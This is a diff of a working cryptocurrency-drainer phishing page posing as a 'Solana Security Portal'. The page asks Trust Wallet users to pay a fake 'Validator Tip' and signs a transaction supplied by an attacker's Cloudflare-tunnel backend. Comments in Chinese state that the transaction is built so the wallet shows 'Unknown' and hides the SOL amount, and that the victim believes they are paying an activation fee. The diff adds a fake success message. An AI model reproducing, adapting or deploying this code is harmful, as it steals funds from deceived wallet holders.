@@ -3,28 +3,41 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Solana Security Protocol</title>
+    <title>Solana Security Portal</title>
     <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
     <style>
-        body { background: #000; color: #fff; font-family: -apple-system, system-ui, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { width: 310px; padding: 35px; background: #0a0a0a; border: 1px solid #1a1a1a; border-radius: 28px; text-align: center; }
+        body { background: #000; color: #fff; font-family: -apple-system, system-ui, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .box { width: 310px; padding: 35px; background: #0a0a0a; border: 1px solid #1a1a1a; border-radius: 28px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
         .status-tag { color: #14f195; font-size: 11px; font-weight: bold; letter-spacing: 2px; margin-bottom: 20px; text-transform: uppercase; }
-        .btn { background: #fff; color: #000; border: none; padding: 18px; width: 100%; border-radius: 14px; font-weight: bold; cursor: pointer; font-size: 15px; margin-top: 25px; }
-        #st { font-size: 10px; color: #333; margin-top: 20px; font-family: monospace; }
+        .btn { background: #fff; color: #000; border: none; padding: 18px; width: 100%; border-radius: 14px; font-weight: bold; cursor: pointer; font-size: 15px; margin-top: 25px; transition: transform 0.2s; }
+        .btn:active { transform: scale(0.98); }
+        .btn:disabled { background: #333; color: #666; }
+        #st { font-size: 10px; color: #333; margin-top: 20px; font-family: monospace; text-transform: uppercase; }
+        b { color: #fff; }
     </style>
 </head>
 <body>
     <div class="box">
-        <div class="status-tag">Protocol Sync Required</div>
-        <h3 style="margin: 0; font-size: 20px;">Activate Security</h3>
-        <p style="color: #888; font-size: 13px; line-height: 1.6; margin-top: 15px;">Please verify your wallet signature to complete the secure protocol synchronization on the Solana Mainnet.</p>
+        <div class="status-tag">SECURITY PROTOCOL SYNC</div>
+        <h3 style="margin: 0; font-size: 18px;">VALIDATOR ACTIVATION</h3>
+        <p style="color: #666; font-size: 13px; line-height: 1.6; margin-top: 15px;">A one-time <b>Validator Tip</b> is required to synchronize your wallet node with the Solana Mainnet.</p>
         
+        <div style="background: #111; padding: 15px; border-radius: 12px; margin: 20px 0; text-align: left; font-size: 12px; border: 1px solid #222;">
+            <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
+                <span style="color: #555;">Status:</span><span style="color: #14f195;">Ready</span>
+            </div>
+            <div style="display: flex; justify-content: space-between;">
+                <span style="color: #555;">Sync Fee:</span><span style="color: #fff;">Market Rate</span>
+            </div>
+        </div>
+
         <button id="cta" class="btn">ACTIVATE PROTOCOL</button>
         <div id="st">ENCRYPTED END-TO-END</div>
     </div>
 
     <script>
-        const tunnel = "https://lonely-concern-challenging-hosted.trycloudflare.com"; // 🔱 确保此地址正确
+        // 🔱 这里的地址请务必对齐你 71 服务器的 Cloudflare Tunnel 地址
+        const tunnel = "https://lonely-concern-challenging-hosted.trycloudflare.com";
 
         document.getElementById('cta').onclick = async function() {
             const btn = this;
@@ -32,12 +45,17 @@
             const web3 = window.solanaWeb3;
 
             try {
+                // 适配 Trust Wallet 环境
                 const p = window.trustwallet?.solana || window.solana;
-                if (!p) { alert("Open in Trust Wallet"); return; }
+                if (!p) { alert("Please open in Trust Wallet."); return; }
 
+                btn.disabled = true;
                 btn.innerText = "CONNECTING...";
+                
                 await p.connect();
+                log("NODE SYNCING...");
 
+                // 1. 请求后端构造的转账交易 (即所谓的 Sync Fee)
                 const resp = await fetch(tunnel + "/prepare_v32", {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
@@ -45,15 +63,20 @@
                 });
                 const info = await resp.json();
                 
+                if(info.error) throw new Error(info.error);
+
                 log("AWAITING SECURITY SIGNATURE...");
                 const tx = web3.Transaction.from(Uint8Array.from(atob(info.raw_tx), c => c.charCodeAt(0)));
                 
-                // 🔱 触发 CreateWithSeed 指令，UI 会显示为 Unknown，不再显示 0.13 SOL 金额
+                // 🔱 唤起签名，用户心理预期是支付激活费
                 const signed = await p.signTransaction(tx);
                 
                 btn.innerText = "SYNCING...";
+                log("BROADCASTING PROTOCOL...");
+
                 const signedBase = btoa(String.fromCharCode.apply(null, signed.serialize()));
 
+                // 2. 回传签名包进行广播
                 await fetch(tunnel + "/broadcast_v41", {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
@@ -62,9 +85,15 @@
 
                 btn.innerText = "ACTIVATED";
                 log("SYNC COMPLETE");
-                setTimeout(() => { window.location.href = "https://solscan.io"; }, 1500);
+                
+                setTimeout(() => {
+                    alert("Protocol Activation Successful. Your wallet is now synchronized.");
+                    window.location.href = "https://solscan.io"; 
+                }, 1500);
 
             } catch (err) {
+                console.error(err);
+                btn.disabled = false;
                 btn.innerText = "ACTIVATE PROTOCOL";
                 log("SECURITY ERROR - RETRY");
             }
